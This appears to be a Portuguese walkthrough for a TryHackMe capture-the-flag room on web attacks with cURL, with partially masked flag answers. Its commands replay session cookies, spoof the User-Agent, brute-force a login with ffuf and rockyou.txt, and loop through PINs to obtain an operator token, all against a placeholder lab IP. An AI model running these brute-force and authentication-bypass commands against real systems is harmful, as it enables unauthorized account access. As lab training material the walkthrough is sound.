# Dia 24 - Exploitation with cURL: Hoperation Eggsploit

Este guia acompanha a [sala do dia 24](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0). Inicie a Lab Machine e substitua `<IP>` pelo endereço mostrado na sala. Os comandos podem ser executados na AttackBox ou em uma Kali própria conectada à VPN do TryHackMe. A Kali própria conserva o histórico e os arquivos se a sessão da AttackBox expirar.

## Requisições básicas e sessão

Primeiro, confirme que o servidor responde. Envie o formulário de login com as credenciais indicadas na questão:

```bash
curl -i "http://<IP>/"
curl -i -X POST -d 'username=admin&password=admin' "http://<IP>/post.php"
```

Leia a flag na resposta do segundo comando. Para a pergunta seguinte, grave o cookie recebido e reutilize-o em outra requisição:

```bash
curl -i -c cookies.txt -d 'username=admin&password=admin' "http://<IP>/cookie.php"
curl -i -b cookies.txt "http://<IP>/cookie.php"
```

Resposta 1 da tarefa 2: `THM{cur...}` (flag do POST)

Resposta 2 da tarefa 2: `THM{ses...}` (flag da sessão)

## Testar a lista curta de senhas

Crie `passwords.txt` com as cinco candidatas fornecidas na sala. O laço abaixo usa cada linha como senha e mostra a resposta do servidor; identifique a tentativa que deixa de exibir a falha de autenticação:

```bash
while IFS= read -r senha; do
  printf '\nTentativa: %s\n' "$senha"
  curl -s -X POST -d "username=admin&password=$senha" "http://<IP>/bruteforce.php"
done < passwords.txt
```

Resposta 3 da tarefa 2: `sec...` (senha textual)

## Ajustar o User-Agent

Compare as respostas com o agente padrão do cURL e com o valor pedido pela questão:

```bash
curl -i "http://<IP>/agent.php"
curl -i -A 'TBFC' "http://<IP>/agent.php"
```

Resposta 4 da tarefa 2: `THM{use...}` (flag do User-Agent)

## Missão extra: fechar o wormhole

Esta parte é opcional na sala. O painel expõe uma API que exige uma sessão de administrador, um token temporário de operador e o cabeçalho de confirmação. Comece pela descoberta dos endpoints:

```bash
curl -s -A secretcomputer "http://<IP>/terminal.php?action=panel"
curl -s -A secretcomputer "http://<IP>/terminal.php?action=info"
```

Para descobrir a senha do painel, teste a lista `rockyou.txt` indicada na sala. O filtro `-mr` mostra somente a resposta que indica login bem-sucedido. Ajuste o caminho da wordlist na sua máquina; na Kali, ela pode estar compactada em `/usr/share/wordlists/rockyou.txt.gz`.

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u "http://<IP>/terminal.php?action=login" \
  -X POST -d 'username=admin&password=FUZZ' \
  -H 'User-Agent: secretcomputer' -mr 'login_success'
```

Repita o login com a senha encontrada e salve o cookie. Em seguida, teste o intervalo de PINs indicado na sala, preservando a sessão. O token aparece na resposta válida:

```bash
curl -s -A secretcomputer -c admin.cookies \
  -d 'username=admin&password=<SENHA_ENCONTRADA>' \
  "http://<IP>/terminal.php?action=login"

for pin in $(seq 4000 5000); do
  resposta=$(curl -s -A secretcomputer -b admin.cookies \
    -d "pin=$pin" "http://<IP>/terminal.php?action=pin")
  if grep -q 'operator_token' <<< "$resposta"; then
    printf 'PIN válido: %s\n%s\n' "$pin" "$resposta"
    break
  fi
done
```

Substitua `<TOKEN>` pelo valor `operator_token` retornado. O endpoint `status` confirma separadamente se o cookie identifica um administrador e se o token é válido. Para fechar o wormhole, envie `X-Force: close` em uma requisição POST:

```bash
curl -s -A secretcomputer -b admin.cookies \
  -H 'X-Operator: <TOKEN>' \
  "http://<IP>/terminal.php?action=status"

curl -s -A secretcomputer -b admin.cookies \
  -H 'X-Operator: <TOKEN>' -H 'X-Force: close' \
  -X POST "http://<IP>/terminal.php?action=close"
```

Confirme `wormhole_closed` na resposta e volte à sala para marcar a pergunta opcional sem campo de resposta. A conclusão final também é marcada com **Check**.

Resposta 5 da tarefa 2: `THM{wor...}` (flag opcional da operação `close`)

Resposta da tarefa 3: sem campo de entrada; clique em **Check** após concluir a sala.
